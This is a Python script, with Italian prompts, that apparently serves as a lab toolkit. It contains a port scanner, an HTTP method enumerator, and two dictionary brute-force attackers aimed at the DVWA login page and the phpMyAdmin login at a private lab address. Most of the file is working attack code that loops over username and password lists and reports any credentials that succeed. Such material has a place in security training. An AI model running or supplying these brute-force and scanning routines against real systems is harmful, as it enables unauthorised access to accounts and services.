import urllib.parse
import http.client
import requests
import socket




def portscan():
	target = input("Inserisci il target: ")
	port_a = int(input("Inserisci il numero di porta iniziale: "))
	port_b = int(input("Inserisci il numero di porta finale: "))


	for port in range(port_a, port_b + 1):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(1)

		result = sock.connect_ex((target, port))

		if result == 0:
	    		print(f"Port {port} is open")

		sock.close()


def metodi():
	ip_target =input("Inserisci Ip Target: ")
	port = 80
	metodi = ["GET", "OPTIONS", "POST", "HEAD", "TRACE", "DELETE", "PUT"]

	for metodo in metodi :
		try:
			conn = http.client.HTTPConnection(ip_target, port)
			conn.request(metodo, "/")
			response = conn.getresponse()
			if response.status < 400:
				print("il metodo ",metodo," è abilitato")

			else:
				print("il metodo {metodo} non è abilitato")
		except ConnectionRefusedError:
			print("connnessione rifiutata")
		except http.client.HTTPException:
			print("Errore durante la richiesta al server")
	conn.close()



def dvwabrute():
	username_file = 'usernames.txt'
	password_file = 'passwords.txt'
	numerotentativi= 0

	with open(username_file, 'r') as usernames:
		with open(password_file, 'r') as passwords:

			username_list = usernames.readlines()
			password_list = passwords.readlines()
		
			for username in username_list :
				for password in password_list:
					username = username.strip()
					password = password.strip()
					post_parameters =urllib.parse.urlencode({'username': username, 'password': password,'Login':'Login'})
					headers = {'Content-Type': 'application/x-www-form-urlencoded', "Accept": "text/html,application/xhtml+xml"}
					conn = http.client.HTTPConnection('192.168.50.101', 80)
					conn.request('POST', '/dvwa/login.php', post_parameters , headers)

					response = conn.getresponse()

					numerotentativi=numerotentativi+1
					new_location=response.getheader('Location')
					
					if new_location != "login.php":
						print('Login riuscito con',numerotentativi,"tentativi")
						print('Accesso riuscito -->',username,'-',password)
						conn.close()
						exit()
					else:
						print('Login non riuscito')
						conn.close()
						
	print('Login non riuscito, fine ciclo')
	conn.close()
	
	
	
	


def myadminbrute():
	username_file = 'usernames.txt'
	password_file = 'passwords.txt'
	numerotentativi= 0

	with open(username_file, 'r') as usernames:
		with open(password_file, 'r') as passwords:
			
			username_list = usernames.readlines()
			password_list = passwords.readlines()
		
			for username in username_list :
				for password in password_list:
					username = username.strip()
					password = password.strip()
					url = 'http://192.168.50.101/phpMyAdmin/' 
					response = requests.post(url, data = {'pma_username': username, 'pma_password': password, 'input_go': "Go"})
					
					numerotentativi=numerotentativi+1
					
					if response.status_code == 200:
						if 'Access denied' in response.text:  
							print('Accesso errato -->',username,'-',password)
							
						else:
							print('Accesso riuscito -->',username,'-',password)
							print('Accesso effettuato in ',numerotentativi,' tentativi')
							exit()
					else:
						print('Errore nella richiesta:', response.status_code)

